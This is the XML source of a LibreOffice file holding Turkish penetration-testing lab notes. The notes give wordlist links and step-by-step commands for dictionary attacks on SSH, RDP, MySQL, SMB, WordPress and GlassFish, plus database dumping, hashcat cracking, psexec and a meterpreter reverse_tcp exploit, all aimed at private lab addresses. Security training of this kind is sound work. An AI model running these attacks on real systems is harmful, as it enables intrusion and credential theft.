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Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:paragraph-rsid="001a4133" style:font-size-asian="10pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#224b12" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="13pt" fo:font-weight="bold" officeooo:rsid="001a4133" officeooo:paragraph-rsid="001a4133" style:font-size-asian="13pt" style:font-weight-asian="bold" style:font-size-complex="13pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="001a4133" officeooo:paragraph-rsid="001a4133" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="001a4133" officeooo:paragraph-rsid="001bd28a" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="001a4133" officeooo:paragraph-rsid="001ca36e" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="001d054b" officeooo:paragraph-rsid="001d054b" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="00213486" officeooo:paragraph-rsid="0021651e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ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="0021651e" officeooo:paragraph-rsid="0021651e" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="00243c5a" officeooo:paragraph-rsid="00243c5a" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="001a4133" officeooo:paragraph-rsid="001a4133" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="001a4133" officeooo:paragraph-rsid="001d054b" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="001a4133" officeooo:paragraph-rsid="0021651e" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="001bd28a" officeooo:paragraph-rsid="001bd28a" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="001d054b" officeooo:paragraph-rsid="001d054b" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="00225514" officeooo:paragraph-rsid="00225514" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="00225514" officeooo:paragraph-rsid="00243c5a" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="001de40b" officeooo:paragraph-rsid="001de40b" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="0021651e" officeooo:paragraph-rsid="0021651e" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P20" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="00225514" officeooo:paragraph-rsid="00243c5a" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P21" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="00297543" officeooo:paragraph-rsid="00297543" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P22" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="002a299b" officeooo:paragraph-rsid="002a299b" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P23" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="002cff6a" officeooo:paragraph-rsid="002cff6a" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P24" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="002ef1e6" officeooo:paragraph-rsid="002ef1e6" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P25" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="00297543" officeooo:paragraph-rsid="00297543" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P26" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="002cff6a" officeooo:paragraph-rsid="002ef1e6" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="001bd28a"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties officeooo:rsid="001ca36e"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties officeooo:rsid="001d054b"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties officeooo:rsid="001de40b"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties officeooo:rsid="0021651e"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties officeooo:rsid="002622af"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties officeooo:rsid="002ef1e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5. BRUTE FORCE VE EXPLOİT SALDIRILARI</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P4">Hazır Dic. linkleri</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">NordVPN - İstatistik:</text:p>
      <text:p text:style-name="P1">https://nordpass.com/most-common-passwords-list/</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">SecLists:</text:p>
      <text:p text:style-name="P1">https://github.com/danielmiessler/SecLists</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">Probable:</text:p>
      <text:p text:style-name="P1">https://github.com/berzerk0/Probable-Wordlists</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">Türkçe Wordlist:</text:p>
      <text:p text:style-name="P1">https://github.com/utkusen/turkce-wordlist</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">Wordlists:</text:p>
      <text:p text:style-name="P1">https://github.com/xajkep/wordlists</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">G0tmik:</text:p>
      <text:p text:style-name="P1"><text:a xlink:type="simple" xlink:href="https://blog.g0tmi1k.com/2011/06/dictionaries-wordlists/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://blog.g0tmi1k.com/2011/06/dictionaries-wordlists/</text:a></text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P4">Nmap ile Dic. Attack</text:p>
      <text:p text:style-name="P11">cd Desktop</text:p>
      <text:p text:style-name="P11">nmap --script ssh-brute --script-args userdb=users.txt,passdb=pass.txt 10.10.10.11-12 -p 22</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P4">Metasploit ile Dic. Attack</text:p>
      <text:p text:style-name="P11">use auxiliary/scanner/ssh/ssh_login</text:p>
      <text:p text:style-name="P11">set rhosts <text:a xlink:type="simple" xlink:href="../../../hosts.txt" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">file:/root/Desktop/hosts.txt</text:a></text:p>
      <text:p text:style-name="P11">set users <text:a xlink:type="simple" xlink:href="../../../hosts.txt" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">file /root/Desktop/users.txt</text:a></text:p>
      <text:p text:style-name="P11">set pass file /root/Desktop/pass.txt</text:p>
      <text:p text:style-name="P11">run</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11">dene (ssh john@10.10.10.12)</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P4">Medusa ile Dic. Attack</text:p>
      <text:p text:style-name="P14">medusa -h</text:p>
      <text:p text:style-name="P14">medusa -U users.txt -P pass.txt -H hosts.txt -M ssh -n 22 -f </text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P5"><text:span text:style-name="T1">Nccrack</text:span> ile Dic. Attack</text:p>
      <text:p text:style-name="P11">ncrack -U users.txt -P pass.txt -iL hosts.txt -m ssh -p 22 -d -f</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P6"><text:span text:style-name="T2">Hydra</text:span> ile Dic. Attack</text:p>
      <text:p text:style-name="P11">hydra -L users.txt -P pass.txt 10.10.10.11 ssh -f -V -o sshpas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SSH Komutları ve Kullanımı</text:p>
      <text:p text:style-name="P11">ssh vagrant@10.10.10.11</text:p>
      <text:p text:style-name="P15">reg export HKLM c:/hklm.reg /y <text:s text:c="4"/>(reg dosyasını export ettik)</text:p>
      <text:p text:style-name="P11">ssh vagrant@10.10.10.11 "echo naber &gt; hacked.txt"<text:span text:style-name="T3">(içinde naber yazan txt gönderdik)</text:span></text:p>
      <text:p text:style-name="P11">ssh vagrant@10.10.10.11 shutdown -f -r -t 05</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P12">ssh vagrant@10.10.10.11 fsutil file createnew hacked2.txt 2000000 </text:p>
      <text:p text:style-name="P15">(büyüklüğünü verdiğimiz bi txt yarattık)</text:p>
      <text:p text:style-name="P12">scp <text:s/>vagrant@10.10.10.11:c:/hklm.reg /root/Desktop <text:s/></text:p>
      <text:p text:style-name="P15">(reg dosyasını kendimize çektik)</text:p>
      <text:p text:style-name="P11">scp /root/Desktop/pass.txt <text:a xlink:type="simple" xlink:href="mailto:vagrant@10.10.10.11" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">vagrant@10.10.10.11</text:a>:c:/</text:p>
      <text:p text:style-name="P15">(bizdeki pass.txt yi karşıya gönderdik)</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11">ssh <text:a xlink:type="simple" xlink:href="mailto:john@10.10.10.12" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">john@10.10.10.12</text:a> <text:s/><text:span text:style-name="T3">(girmeye çalıştık)</text:span></text:p>
      <text:p text:style-name="P11">ssh john@10.10.10.12 -o KexAlgorithms=diffie-hellman-group-exchange-sha1 -o HostKeyAlgorithms=ssh-dss -c 3des-cbc</text:p>
      <text:p text:style-name="P15">(gereken algoritmaları girdikten sonra login olduk.)</text:p>
      <text:p text:style-name="P15">ls -l -a <text:s/>(gizli dosyalara baktık.)</text:p>
      <text:p text:style-name="P15">scp -o KexAlgorithms=diffie-hellman-group-exchange-sha1 -o HostKeyAlgorithms=ssh-dss -c 3des-cbc /root/Desktop/pass.txt <text:a xlink:type="simple" xlink:href="mailto:john@10.10.10.12" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">john@10.10.10.12</text:a>:/home/john/pass.txt</text:p>
      <text:p text:style-name="P15">(pass.txt yi bizden karşıya taşıdık)</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P18">RDP ye dic. Attack ve RDesktop</text:p>
      <text:p text:style-name="P15">hydra -L users.txt -P pass.txt rdp://10.10.10.11 -f -vV -t 1 <text:span text:style-name="T4">(t, 1den 5 hızı artar)</text:span></text:p>
      <text:p text:style-name="P15">-<text:span text:style-name="T4">I <text:s text:c="2"/>(baştaki 10 saniyelik kısmı geçer)(restoring file)</text:span></text:p>
      <text:p text:style-name="P15">rdesktop 10.10.10.11 -k tr -z -u vagrant -p vagrant <text:s/><text:span text:style-name="T4">(login ekranına girer)</text:span></text:p>
      <text:p text:style-name="P15">rdesktop 10.10.10.11 -k tr -z -f</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P8">MySQL e Dic. Attack ve Null Password</text:p>
      <text:p text:style-name="P13">hydra -L users.txt -p pass.txt 10.10.10.11 mysql -vV -<text:span text:style-name="T5">f</text:span></text:p>
      <text:p text:style-name="P19">(user ve pass aradık. Bulunamadı.)</text:p>
      <text:p text:style-name="P13">hydra -L users.txt -p pass.txt 10.10.10.11 mysql -vV -f -<text:span text:style-name="T5">e n </text:span></text:p>
      <text:p text:style-name="P19">(null pasword ile aratınca root u bulduk.)</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P9">MySQL Komutları, Kullanımı ve DBDump</text:p>
      <text:p text:style-name="P16">MySQL veritabanını xml gibi düşün</text:p>
      <text:p text:style-name="P16">mysql -u root -h 10.10.10.11</text:p>
      <text:p text:style-name="P11">show databases;</text:p>
      <text:p text:style-name="P16">use wordpress;</text:p>
      <text:p text:style-name="P16">show tables;</text:p>
      <text:p text:style-name="P16">desc wp_users;</text:p>
      <text:p text:style-name="P11">select user_login,user_pass from wp_users;</text:p>
      <text:p text:style-name="P11">select * from wp_users;</text:p>
      <text:p text:style-name="P11">show databases; use wordpress; show tables;</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P16">uzaktan işlem..</text:p>
      <text:p text:style-name="P16">mysqlshow -h 10.10.10.11 --user root</text:p>
      <text:p text:style-name="P11">mysqlshow -h 10.10.10.11 --user root wordpress </text:p>
      <text:p text:style-name="P11">mysqlshow -h 10.10.10.11 --user root wordpress --count</text:p>
      <text:p text:style-name="P11">mysql -h 10.10.10.11 -u root wordpress -e 'select * from wp_users;'</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P16">DBDump..</text:p>
      <text:p text:style-name="P16">mysqldump -h 10.10.10.11 wordpress wp_users &gt; /root/Desktop/hackeddb.sql</text:p>
      <text:p text:style-name="P10"><text:soft-page-break/>Hash Cracking</text:p>
      <text:p text:style-name="P17">hashcat -h</text:p>
      <text:p text:style-name="P17">hashcat -h | grep phpass</text:p>
      <text:p text:style-name="P17">hashcat -m 400 -a 0 ~/Desktop/hashes ~/Desktop/pass.txt --status</text:p>
      <text:p text:style-name="P17">hashcat -m 400 -a 3 ~/Desktop/hashes administrator --status</text:p>
      <text:p text:style-name="P17">hashcat -m 400 -a 3 ~/Desktop/hashes administrator –status –<text:span text:style-name="T6">show</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P25">Wordpress login e Dic. Attack</text:p>
      <text:p text:style-name="P24">10.10.10.11:8585</text:p>
      <text:p text:style-name="P21">msfconsole</text:p>
      <text:p text:style-name="P21">search wordpress_login</text:p>
      <text:p text:style-name="P21">ayarla</text:p>
      <text:p text:style-name="P21">rhosts, rport, targeturi(wordpress dizini), user_file, pass_file, verbose</text:p>
      <text:p text:style-name="P21">run</text:p>
      <text:p text:style-name="P21"/>
      <text:p text:style-name="P21"/>
      <text:p text:style-name="P25">ManageEngine e login Attack</text:p>
      <text:p text:style-name="P24">10.10.10.11:8020</text:p>
      <text:p text:style-name="P22">search central_login</text:p>
      <text:p text:style-name="P22">ayarla, run</text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P26">SMB ye Dic. Attack + Exploit + Hash Crack</text:p>
      <text:p text:style-name="P23">hydra -L users.txt -P pass.txt 10.10.10.11 smb</text:p>
      <text:p text:style-name="P23">search smb_login</text:p>
      <text:p text:style-name="P23">ayarla, run, bulduk.</text:p>
      <text:p text:style-name="P23">search smb/psexec</text:p>
      <text:p text:style-name="P23">ayarla, run, meterpreterdayız..</text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P23">search secrets</text:p>
      <text:p text:style-name="P23">ayarla, run <text:s/>(administrator olarak) <text:s/>(password hash lerini aldık.)</text:p>
      <text:p text:style-name="P23">hash-identifier <text:s text:c="2"/>(buraya hash I yazarak muhtemel hashini aldık.)</text:p>
      <text:p text:style-name="P23">hashcat -m 1000 -a 0 ~/Desktop/hashes2 ~/Desktop/pass.txt --status <text:s/>(hashi çözdük.)</text:p>
      <text:p text:style-name="P23">hashcat -m 1000 -a 0 ~/Desktop/hashes2 ~/Desktop/pass.txt --status --show </text:p>
      <text:p text:style-name="P23">(eğer wordlistte varsa gösterir.)</text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P26"><text:span text:style-name="T7">Glass Fish </text:span>e Dic. Attack + Exploit</text:p>
      <text:p text:style-name="P24">10.10.10.11:4848</text:p>
      <text:p text:style-name="P24">search glassfish_login</text:p>
      <text:p text:style-name="P24">ayarla, run. <text:s text:c="5"/>(login ve pass bulduk)</text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P24">search glassfish</text:p>
      <text:p text:style-name="P24">kullanacağımız auxiliary nin infosunu aldık. Info 5</text:p>
      <text:p text:style-name="P24">burada hangi versionlarda çalıştığı gözükür..</text:p>
      <text:p text:style-name="P24">ayarları yaptık <text:s text:c="16"/>(adres https ile başladığından ssl true ayarladık.)</text:p>
      <text:p text:style-name="P24">show targets, set target 2 <text:s text:c="5"/>(hedefimiz windows kullandığından ayarladık)</text:p>
      <text:p text:style-name="P24">set payload windows/meterpreter/reverse_tcp <text:s text:c="4"/>(payload değiştik)</text:p>
      <text:p text:style-name="P24">run.. <text:s text:c="2"/>içerdeyiz</text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P2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1T15:34:57.473771278</meta:creation-date>
    <dc:date>2022-09-02T18:31:24.172710390</dc:date>
    <meta:editing-duration>PT4H33M6S</meta:editing-duration>
    <meta:editing-cycles>16</meta:editing-cycles>
    <meta:generator>LibreOffice/7.4.0.3$Linux_X86_64 LibreOffice_project/40$Build-3</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="3" meta:paragraph-count="115" meta:word-count="561" meta:character-count="4436" meta:non-whitespace-character-count="3947"/>
  </office:meta>
</office:document-meta>
</file>